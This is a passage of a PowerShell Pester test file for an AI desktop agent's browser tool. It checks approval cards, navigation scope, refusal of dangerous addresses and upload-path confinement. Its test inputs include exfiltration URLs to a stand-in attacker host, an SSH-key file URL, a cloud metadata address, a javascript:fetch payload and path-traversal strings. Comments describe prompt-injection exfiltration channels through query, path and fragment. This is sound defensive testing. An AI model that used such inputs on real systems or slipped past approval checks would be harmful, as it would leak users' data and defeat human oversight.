                $response = Invoke-DpBrowserRequest -Session $session -Command 'events' -Payload @{ count = 4 } -TimeoutSeconds 20
                $response.ok | Should -BeTrue
                $session.events.Count | Should -Be 4
                $session.events[0].event | Should -Be 'blocked'
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'reports a refusal as an answer rather than throwing' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'fail' -TimeoutSeconds 20
                $response.ok | Should -BeFalse
                $response.error | Should -Match 'refused'
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }
    }

    Context 'a supervisor that misbehaves' -Skip:(-not $script:NodeForProtocol) {
        It 'gives up on a command that never answers' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'hang' -TimeoutSeconds 2
                $response.ok | Should -BeFalse
                $session.faulted | Should -BeTrue
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'refuses every later command once the session has faulted' {
            $session = New-DpFakeSession
            try {
                $null = Invoke-DpBrowserRequest -Session $session -Command 'hang' -TimeoutSeconds 2
                $again = Invoke-DpBrowserRequest -Session $session -Command 'echo' -Payload @{ value = 'x' } -TimeoutSeconds 5
                $again.ok | Should -BeFalse
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'reports a crash instead of waiting for an answer that cannot come' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'crash' -TimeoutSeconds 10
                $response.ok | Should -BeFalse
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        # Attributing an answer to the wrong action is the failure an approval
        # boundary exists to prevent, so it ends the session rather than resyncing.
        It 'closes the session when an answer carries the wrong id' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'wrong_id' -TimeoutSeconds 10
                $response.ok | Should -BeFalse
                $session.faulted | Should -BeTrue
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'treats output that is not protocol as a broken child' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'garbage' -TimeoutSeconds 10
                $response.ok | Should -BeFalse
                $session.faulted | Should -BeTrue
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'refuses a line too large to be an answer' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'flood' -TimeoutSeconds 20
                $response.ok | Should -BeFalse
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }
    }

    Context 'stopping' -Skip:(-not $script:NodeForProtocol) {
        It 'ends the operating system process, not just the handle' {
            $session = New-DpFakeSession
            $processId = $session.process.Id
            Stop-DpBrowserSession -Session $session -Confirm:$false
            Get-Process -Id $processId -ErrorAction SilentlyContinue | Should -BeNullOrEmpty
        }

        It 'can be called twice' {
            $session = New-DpFakeSession
            Stop-DpBrowserSession -Session $session -Confirm:$false
            { Stop-DpBrowserSession -Session $session -Confirm:$false } | Should -Not -Throw
        }

        It 'refuses commands after the session is stopped' {
            $session = New-DpFakeSession
            Stop-DpBrowserSession -Session $session -Confirm:$false
            (Invoke-DpBrowserRequest -Session $session -Command 'echo' -TimeoutSeconds 5).ok | Should -BeFalse
        }
    }
}

Describe 'Invoke-DpBrowserTool' -Tag 'Unit' {
    BeforeAll {
        # A stand-in for the approval rendezvous. Records what it was asked and
        # answers with whatever the test told it to, including a fingerprint that
        # does not match - which is how a replayed approval is simulated.
        function New-DpFakeBridge {
            param(
                [string]$Decision = 'approve',
                [string]$Note = '',
                [switch]$Disabled,
                [switch]$WrongFingerprint,
                [switch]$TimeOut
            )
            $bridge = [pscustomobject]@{
                Enabled  = -not $Disabled
                Asked    = [System.Collections.Generic.List[string]]::new()
                Decision = $Decision
                Note     = $Note
                Wrong    = [bool]$WrongFingerprint
                TimeOut  = [bool]$TimeOut
            }
            $bridge | Add-Member -MemberType ScriptMethod -Name CaptureQuestion -Value {
                param([string]$Question)
                $this.Asked.Add($Question)
            }
            $bridge | Add-Member -MemberType ScriptMethod -Name RequestAnswer -Value {
                param([int]$Seconds)
                if ($this.TimeOut) { throw [System.TimeoutException]::new('nobody answered') }
                $request = $this.Asked[-1] | ConvertFrom-Json
                $fingerprint = if ($this.Wrong) { 'f' * 64 } else { $request.fingerprint }
                @{ decision = $this.Decision; note = $this.Note; fingerprint = $fingerprint } | ConvertTo-Json -Compress
            }
            $bridge
        }

        function New-DpFakePage {
            param([string]$Url = 'https://weathercity.com/cl/ll/osorno')
            [pscustomobject]@{
                url       = $Url
                title     = 'Osorno'
                status    = 200
                text      = 'Osorno forecast: 12 degrees.'
                truncated = $false
                links     = @([pscustomobject]@{ text = 'Puerto Montt'; href = 'https://weathercity.com/cl/ll/puerto_montt' })
            }
        }

        # A real folder, so the upload path confinement is exercised against the
        # file system rather than against a mock of it.
        $script:ProjectRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-proj-" + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:ProjectRoot -Force | Out-Null
        Set-Content -LiteralPath (Join-Path $script:ProjectRoot 'report.txt') -Value 'report' -Encoding utf8
        New-Item -ItemType Directory -Path (Join-Path $script:ProjectRoot 'sub') -Force | Out-Null
        Set-Content -LiteralPath (Join-Path $script:ProjectRoot 'sub' 'nested.txt') -Value 'nested' -Encoding utf8
    }

    AfterAll {
        if ($script:ProjectRoot -and (Test-Path -LiteralPath $script:ProjectRoot)) {
            Remove-Item -LiteralPath $script:ProjectRoot -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    BeforeEach {
        $global:DeskPilotBrowserContext = @{
            conversationId = 'c-1'
            turnId         = 't-1'
            project        = 'Alpha'
            projectRoot    = $script:ProjectRoot
            projectDomains = @()
            actions        = @()
            runtimeRoot    = 'C:\runtime'
            downloadRoot   = 'C:\runtime\downloads'
            # The user's own words. Scope comes from here, never from the URL the
            # Model chose - see Blocker B-1.
            userUrl        = 'please read https://weathercity.com/ for the Osorno forecast'
        }
        $global:DeskPilotBrowserState = @{ session = $null; scope = @(); granted = @(); lastUrl = '' }
        $global:DeskPilotBrowserBridge = New-DpFakeBridge
        $global:DeskPilotBrowserTimeoutMinutes = 15

        Mock Start-DpBrowserSession {
            @{ process = $null; faulted = $false; scope = @($Scope); events = [System.Collections.Generic.List[object]]::new(); pageLinks = @() }
        }
        # The scope command has to answer like the supervisor does, or the state
        # under test is the mock's rather than the code's.
        Mock Invoke-DpBrowserRequest {
            if ($Command -eq 'scope') { return @{ ok = $true; result = [pscustomobject]@{ scope = @($Payload.hosts) } } }
            @{ ok = $true; result = (New-DpFakePage) }
        }
    }

    AfterEach {
        foreach ($name in 'DeskPilotBrowserContext', 'DeskPilotBrowserState', 'DeskPilotBrowserBridge', 'DeskPilotBrowserTimeoutMinutes') {
            Remove-Variable -Name $name -Scope Global -ErrorAction SilentlyContinue
        }
    }

    Context 'the workflow that was authorised' {
        It 'opens the site the user named without asking anyone' {
            $result = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/' | ConvertFrom-Json
            $result.ok | Should -BeTrue
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        It 'takes the scope from the user message, not from the address the model chose' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserState.scope | Should -Contain 'weathercity.com'
        }

        # The free hop: before B-1 was fixed, the first open of every Turn was
        # allowed to any host on the internet with no card at all, which is a
        # complete exfiltration channel for the Model's context.
        It 'asks about a host the user never named, even as the first navigation' {
            $result = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot' | ConvertFrom-Json
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
            $result.ok | Should -BeTrue -Because 'the fake bridge approves'
        }

        It 'asks nothing when the project already allows the host' {
            $global:DeskPilotBrowserContext.userUrl = 'check the portal'
            $global:DeskPilotBrowserContext.projectDomains = @('portal.test')
            $null = Invoke-DpBrowserTool -Action open -Url 'https://portal.test/'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        It 'follows a link by its visible text' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            (Invoke-DpBrowserTool -Action click_link -LinkText 'Chile' | ConvertFrom-Json).ok | Should -BeTrue
            Should -Invoke Invoke-DpBrowserRequest -ParameterFilter { $Command -eq 'click' } -Times 1 -Exactly
        }

        It 'labels page text as information rather than instructions' {
            $result = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/' | ConvertFrom-Json
            $result.pageText | Should -Match 'Osorno forecast'
            $result.pageTextNote | Should -Match 'not instructions'
        }
    }

    Context 'addresses that are never opened' {
        # Nothing here may reach the supervisor, so the assertion is on the
        # absence of the call, not on the message.
        It 'refuses <Url> without contacting anything' -TestCases @(
            @{ Url = 'file:///C:/Users/install/.ssh/id_rsa' }
            @{ Url = 'http://weathercity.com/' }
            @{ Url = 'https://127.0.0.1:8720/api/settings' }
            @{ Url = 'https://169.254.169.254/latest/meta-data/' }
            @{ Url = 'https://user:secret@weathercity.com/' }
            @{ Url = 'javascript:fetch("https://attacker.test")' }
        ) {
            param($Url)
            $result = Invoke-DpBrowserTool -Action open -Url $Url | ConvertFrom-Json
            $result.ok | Should -BeFalse
            Should -Invoke Start-DpBrowserSession -Times 0 -Exactly
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        It 'does not echo a secret from the address back to the model' {
            $result = Invoke-DpBrowserTool -Action open -Url 'https://user:hunter2@weathercity.com/'
            $result | Should -Not -Match 'hunter2'
        }
    }

    Context 'leaving the site' {
        It 'asks before opening an off-scope address' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
        }

        # Same-origin egress: the Model composes the whole address, so a query
        # string it invented on the user's own site is the same channel one hop
        # shorter. Only an address the page itself offered runs silently.
        It 'asks before opening a model-composed query on an in-scope host' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/x?leak=D%3A%5CGit%5CDeskPilot'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
        }

        # A Model-composed path is the same channel as a Model-composed query,
        # one character different: the path lands in the access log of the host
        # doing the injecting.
        It 'asks before opening a model-composed path on an in-scope host' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/L2hvbWUvYm9iL3Byb2plY3Q'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
        }

        It 'does not ask for the site root' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        It 'does not ask for a link the page itself offered' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserState.session.pageLinks = @('https://weathercity.com/cl/ll/osorno')
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/cl/ll/osorno'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        # The fragment never leaves over the network, but location.hash reads it
        # in full and an off-origin image can then carry it out.
        It 'asks when a fragment is appended to a link the page offered' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserState.session.pageLinks = @('https://weathercity.com/page')
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/page#L2hvbWUvYm9i'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
        }

        It 'does not ask for an address the user wrote themselves' {
            $global:DeskPilotBrowserContext.userUrl = 'check https://weathercity.com/cl/?units=metric please'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/cl/?units=metric'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        It 'shows the whole address, including the part after the question mark' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot'
            $asked = $global:DeskPilotBrowserBridge.Asked[0] | ConvertFrom-Json
            $asked.summary.url | Should -Match 'ctx='
            $asked.summary.host | Should -Be 'attacker.test'
            $asked.class | Should -Be 'BrowserNavigation'
        }

        It 'does not navigate when the user declines' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge = New-DpFakeBridge -Decision 'deny' -Note 'not that site'

            $result = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'not that site'
            Should -Invoke Invoke-DpBrowserRequest -ParameterFilter { $Command -eq 'navigate' } -Times 1 -Exactly
        }

        It 'widens the scope only after the user approves' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/'
            $global:DeskPilotBrowserState.granted | Should -Contain 'attacker.test'
        }

        # An answer that does not carry this navigation's fingerprint could be a
        # stale card from an earlier Turn, so it is treated as a denial.
        It 'refuses an approval that does not match this navigation' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge = New-DpFakeBridge -WrongFingerprint

            $result = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'did not match'
            $global:DeskPilotBrowserState.granted | Should -Not -Contain 'attacker.test'
        }

        It 'denies rather than proceeding when nobody answers' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge = New-DpFakeBridge -TimeOut

            $result = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'approved'
        }

        It 'refuses when there is no way to ask' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge = New-DpFakeBridge -Disabled

            (Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/' | ConvertFrom-Json).ok | Should -BeFalse
        }

        It 'asks again for the next new host rather than reusing the grant' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://first.test/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://second.test/'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 2
        }
    }

    Context 'a project that added domains' {
        It 'does not ask for a host the project already allows' {
            $global:DeskPilotBrowserContext.projectDomains = @('partner.test')
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://partner.test/'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        # The grant was previously pushed only when the scope count changed, and
        # the count almost never changed - so the supervisor kept refusing the
        # navigation the user had just approved.
        It 'pushes the widened scope to the browser after a grant' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://granted.test/'
            Should -Invoke Invoke-DpBrowserRequest -ParameterFilter {
                $Command -eq 'scope' -and (@($Payload.hosts) -contains 'granted.test')
            } -Times 1 -Exactly
        }

        It 'keeps the original site in scope after a detour is approved' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://granted.test/'
            $global:DeskPilotBrowserState.scope | Should -Contain 'weathercity.com'
        }
    }

    Context 'what the page tried to do' {
        It 'reports refusals the supervisor made on its own' {
            Mock Invoke-DpBrowserRequest {
                @{ ok = $true; result = (New-DpFakePage) }
            }
            Mock Start-DpBrowserSession {
                $events = [System.Collections.Generic.List[object]]::new()
                $events.Add([pscustomobject]@{ event = 'blocked'; reason = 'resource'; url = 'https://attacker.test/t.js' })
                @{ process = $null; faulted = $false; scope = @($Scope); events = $events }
            }

            $result = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/' | ConvertFrom-Json
            $result.blocked[0].reason | Should -Be 'resource'
        }
    }

    Context 'using the tool out of order' {
        It 'refuses <Action> before any page is open' -TestCases @(
            @{ Action = 'read_page' }, @{ Action = 'screenshot' }, @{ Action = 'click_link' }
        ) {
            param($Action)
            $result = Invoke-DpBrowserTool -Action $Action -LinkText 'Chile' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
        }

        It 'refuses an open with no address' {
            (Invoke-DpBrowserTool -Action open -Url '' | ConvertFrom-Json).ok | Should -BeFalse
        }

        It 'refuses a link name long enough to be a payload' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            (Invoke-DpBrowserTool -Action click_link -LinkText ('a' * 500) | ConvertFrom-Json).ok | Should -BeFalse
        }

        It 'refuses an action it does not offer' {
            { Invoke-DpBrowserTool -Action 'submit_form' } | Should -Throw
        }
    }
}

Describe 'Browser write capabilities' -Tag 'Unit' {
    BeforeAll {
        $script:WriteRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-write-" + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:WriteRoot -Force | Out-Null
        Set-Content -LiteralPath (Join-Path $script:WriteRoot 'report.txt') -Value 'report' -Encoding utf8

        $script:Outside = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-outside-" + [guid]::NewGuid().ToString('N') + '.txt')
        Set-Content -LiteralPath $script:Outside -Value 'secret' -Encoding utf8

        function New-DpWriteBridge {
            param([string]$Decision = 'approve', [switch]$WrongFingerprint)
            $bridge = [pscustomobject]@{
                Enabled  = $true
                Asked    = [System.Collections.Generic.List[string]]::new()
                Decision = $Decision
                Wrong    = [bool]$WrongFingerprint
            }
            $bridge | Add-Member -MemberType ScriptMethod -Name CaptureQuestion -Value {
                param([string]$Question)
                $this.Asked.Add($Question)
            }
            $bridge | Add-Member -MemberType ScriptMethod -Name RequestAnswer -Value {
                param([int]$Seconds)
                $request = $this.Asked[-1] | ConvertFrom-Json
                $fingerprint = if ($this.Wrong) { 'f' * 64 } else { $request.fingerprint }
                @{ decision = $this.Decision; note = ''; fingerprint = $fingerprint } | ConvertTo-Json -Compress
            }
            $bridge
        }
    }

    AfterAll {
        foreach ($path in $script:WriteRoot, $script:Outside) {
            if ($path -and (Test-Path -LiteralPath $path)) {
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    }

    BeforeEach {
        $global:DeskPilotBrowserContext = @{
            conversationId = 'c-1'
            turnId         = 't-1'
            project        = 'Alpha'
            projectRoot    = $script:WriteRoot
            projectDomains = @()
            actions        = @()
            runtimeRoot    = 'C:\runtime'
            downloadRoot   = 'C:\runtime\downloads'
        }
        # A page is already open, so the capability check is what is under test
        # rather than the "no page yet" refusal.
        $global:DeskPilotBrowserState = @{
            session = @{ faulted = $false; events = [System.Collections.Generic.List[object]]::new() }
            scope   = @('weathercity.com')
            granted = @()
            lastUrl = 'https://weathercity.com/form'
        }
        $global:DeskPilotBrowserBridge = New-DpWriteBridge
        $global:DeskPilotBrowserTimeoutMinutes = 15

        Mock Invoke-DpBrowserRequest { @{ ok = $true; result = [pscustomobject]@{ url = 'https://weathercity.com/done'; title = 'Done'; text = 'Saved.' } } }
    }

    AfterEach {
        foreach ($name in 'DeskPilotBrowserContext', 'DeskPilotBrowserState', 'DeskPilotBrowserBridge', 'DeskPilotBrowserTimeoutMinutes') {
            Remove-Variable -Name $name -Scope Global -ErrorAction SilentlyContinue
        }
    }

    Context 'a project that granted nothing' {
        # Refused before any card is offered, so a capability the project never
        # granted cannot be talked into existence in the moment.
        It 'refuses <Action> without asking the user' -TestCases @(
            @{ Action = 'fill_form'; Extra = @{ Fields = '[{"name":"City","value":"Osorno"}]' } }
            @{ Action = 'click_button'; Extra = @{ ButtonText = 'Delete' } }
            @{ Action = 'upload_file'; Extra = @{ FieldName = 'file'; Path = 'report.txt' } }
            @{ Action = 'download_file'; Extra = @{ ButtonText = 'Export' } }
        ) {
            param($Action, $Extra)
            $result = Invoke-DpBrowserTool -Action $Action @Extra | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'does not allow'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
        }

        It 'still allows reading' {
            (Invoke-DpBrowserTool -Action read_page | ConvertFrom-Json).ok | Should -BeTrue
        }
    }

    Context 'filling a form' {
        BeforeEach { $global:DeskPilotBrowserContext.actions = @('fill') }

        It 'asks before typing anything' {
            $null = Invoke-DpBrowserTool -Action fill_form -Fields '[{"name":"City","value":"Osorno"}]'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
        }

        It 'shows every value on the card, because the values are what leave the machine' {
            $null = Invoke-DpBrowserTool -Action fill_form -Fields '[{"name":"City","value":"Osorno"},{"name":"Window","value":"Monday 02:00"}]'
            $asked = $global:DeskPilotBrowserBridge.Asked[0] | ConvertFrom-Json
            $asked.class | Should -Be 'BrowserAction'
            $asked.summary.action | Should -Be 'fill_form'
            @($asked.summary.fields).Count | Should -Be 2
            $asked.summary.fields[1].value | Should -Be 'Monday 02:00'
        }

        It 'types nothing when the user declines' {
            $global:DeskPilotBrowserBridge = New-DpWriteBridge -Decision 'deny'
            $result = Invoke-DpBrowserTool -Action fill_form -Fields '[{"name":"City","value":"Osorno"}]' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
        }

        # The fingerprint covers the values, so an approval for one set cannot be
        # spent on another - which is the substitution an injected page wants.
        It 'refuses an approval that does not match these values' {
            $global:DeskPilotBrowserBridge = New-DpWriteBridge -WrongFingerprint
            $result = Invoke-DpBrowserTool -Action fill_form -Fields '[{"name":"City","value":"Osorno"}]' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
        }

        It 'produces a different fingerprint for different values' {
            $null = Invoke-DpBrowserTool -Action fill_form -Fields '[{"name":"City","value":"Osorno"}]'
            $first = ($global:DeskPilotBrowserBridge.Asked[0] | ConvertFrom-Json).fingerprint
            $null = Invoke-DpBrowserTool -Action fill_form -Fields '[{"name":"City","value":"Santiago"}]'
            $second = ($global:DeskPilotBrowserBridge.Asked[1] | ConvertFrom-Json).fingerprint
            $second | Should -Not -Be $first
        }

        It 'refuses to submit when only fill was granted' {
            $result = Invoke-DpBrowserTool -Action fill_form -Fields '[{"name":"City","value":"Osorno"}]' -SubmitWith 'Save' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'does not allow'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        It 'submits when both were granted, and names the button on the card' {
            $global:DeskPilotBrowserContext.actions = @('fill', 'submit')
            $null = Invoke-DpBrowserTool -Action fill_form -Fields '[{"name":"City","value":"Osorno"}]' -SubmitWith 'Save'
            ($global:DeskPilotBrowserBridge.Asked[0] | ConvertFrom-Json).summary.control | Should -Be 'Save'
            Should -Invoke Invoke-DpBrowserRequest -ParameterFilter { $Command -eq 'fill' } -Times 1 -Exactly
        }

        It 'refuses <Description> before asking' -TestCases @(
            @{ Fields = ''; Description = 'no fields at all' }
            @{ Fields = 'not json'; Description = 'text that is not JSON' }
            @{ Fields = '[{"value":"x"}]'; Description = 'a field with no name' }
            @{ Fields = '[]'; Description = 'an empty list' }
        ) {
            param($Fields)
            $result = Invoke-DpBrowserTool -Action fill_form -Fields $Fields | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }
    }

    Context 'pressing a control' {
        BeforeEach { $global:DeskPilotBrowserContext.actions = @('submit') }

        It 'names the control on the card' {
            $null = Invoke-DpBrowserTool -Action click_button -ButtonText 'Delete account'
            $asked = $global:DeskPilotBrowserBridge.Asked[0] | ConvertFrom-Json
            $asked.summary.control | Should -Be 'Delete account'
            $asked.risk | Should -Match 'delete'
        }

        It 'presses nothing when the user declines' {
            $global:DeskPilotBrowserBridge = New-DpWriteBridge -Decision 'deny'
            (Invoke-DpBrowserTool -Action click_button -ButtonText 'Delete' | ConvertFrom-Json).ok | Should -BeFalse
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
        }

        It 'asks again for a second press rather than reusing the first answer' {
            $null = Invoke-DpBrowserTool -Action click_button -ButtonText 'Delete'
            $null = Invoke-DpBrowserTool -Action click_button -ButtonText 'Delete'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 2
        }
    }

    Context 'uploading a file' {
        BeforeEach { $global:DeskPilotBrowserContext.actions = @('upload') }

        It 'uploads a file inside the project' {
            $result = Invoke-DpBrowserTool -Action upload_file -FieldName 'attachment' -Path 'report.txt' | ConvertFrom-Json
            $result.ok | Should -BeTrue
            Should -Invoke Invoke-DpBrowserRequest -ParameterFilter { $Command -eq 'upload' } -Times 1 -Exactly
        }

        It 'shows the resolved path on the card' {
            $null = Invoke-DpBrowserTool -Action upload_file -FieldName 'attachment' -Path 'report.txt'
            ($global:DeskPilotBrowserBridge.Asked[0] | ConvertFrom-Json).summary.filePath | Should -Match 'report\.txt$'
        }

        # The project boundary is the same one every workspace Tool uses, and it
        # is checked before an approval is offered - a card naming a file outside
        # the project would be asking the user to authorise a mistake.
        It 'refuses <Description> without asking' -TestCases @(
            @{ Path = '..\..\Windows\System32\drivers\etc\hosts'; Description = 'a traversal out of the project' }
            @{ Path = 'C:\Windows\System32\drivers\etc\hosts'; Description = 'an absolute path elsewhere' }
            @{ Path = 'missing.txt'; Description = 'a file that does not exist' }
        ) {
            param($Path)
            $result = Invoke-DpBrowserTool -Action upload_file -FieldName 'attachment' -Path $Path | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
        }

        It 'refuses when no project folder is selected' {
            $global:DeskPilotBrowserContext.projectRoot = ''
            (Invoke-DpBrowserTool -Action upload_file -FieldName 'a' -Path 'report.txt' | ConvertFrom-Json).ok | Should -BeFalse
        }
    }

    Context 'downloading a file' {
        BeforeEach { $global:DeskPilotBrowserContext.actions = @('download') }

        It 'asks first and names the holding folder' {
            $null = Invoke-DpBrowserTool -Action download_file -ButtonText 'Export'
            $asked = $global:DeskPilotBrowserBridge.Asked[0] | ConvertFrom-Json
            $asked.summary.action | Should -Be 'download_file'
            $asked.summary.filePath | Should -Be 'C:\runtime\downloads'
        }

        It 'saves nothing when the user declines' {
            $global:DeskPilotBrowserBridge = New-DpWriteBridge -Decision 'deny'
            (Invoke-DpBrowserTool -Action download_file -ButtonText 'Export' | ConvertFrom-Json).ok | Should -BeFalse
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
        }
    }

    Context 'one capability does not imply another' {
        It '<Granted> does not enable <Blocked>' -TestCases @(
            @{ Granted = 'fill'; Blocked = 'click_button'; Extra = @{ ButtonText = 'Delete' } }
            @{ Granted = 'submit'; Blocked = 'upload_file'; Extra = @{ FieldName = 'f'; Path = 'report.txt' } }
            @{ Granted = 'upload'; Blocked = 'download_file'; Extra = @{ ButtonText = 'Export' } }
            @{ Granted = 'download'; Blocked = 'fill_form'; Extra = @{ Fields = '[{"name":"a","value":"b"}]' } }
        ) {
            param($Granted, $Blocked, $Extra)
            $global:DeskPilotBrowserContext.actions = @($Granted)
            $result = Invoke-DpBrowserTool -Action $Blocked @Extra | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'does not allow'
        }
    }
}

# A payload field the card does not render is a field nobody approved. The
# browser cards shipped once with only the terminal's two fields wired up, so a
# navigation asked the reader to "check the whole address" and then showed no
# address at all. These are the guards against that returning.
Describe 'Approval card renders what is being approved' -Tag 'Unit' {
    BeforeAll {
        $webRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'web' | Convert-Path
        $script:AppJs = Get-Content -LiteralPath (Join-Path $webRoot 'assets' 'app.js') -Raw
        $script:LocaleFiles = @{
            en = Get-Content -LiteralPath (Join-Path $webRoot 'assets' 'locales' 'en.js') -Raw
            de = Get-Content -LiteralPath (Join-Path $webRoot 'assets' 'locales' 'de.js') -Raw
        }

        # Derived from the function rather than hard-coded, so adding a summary
        # field to the API fails this test until the card shows it.
        $script:SummaryKeys = @((New-DpApprovalRequest -Tool 'browser_page' -Class 'BrowserAction' `
                    -Argument @{ action = 'fill_form'; url = 'https://x.test/'; host = 'x.test'; control = 'Save'; filePath = 'C:\p\a.txt'; fields = @(@{ name = 'a'; value = 'b' }) } `
                    -ConversationId 'c-1' -TurnId 't-1').summary.Keys)
    }

    It 'reads every field the approval request carries' -TestCases @(
        @{ Key = 'command' }, @{ Key = 'workingDirectory' }, @{ Key = 'url' }
        @{ Key = 'action' }, @{ Key = 'control' }, @{ Key = 'filePath' }, @{ Key = 'fields' }
    ) {
        param($Key)
        $script:SummaryKeys | Should -Contain $Key -Because 'the request must still carry it'
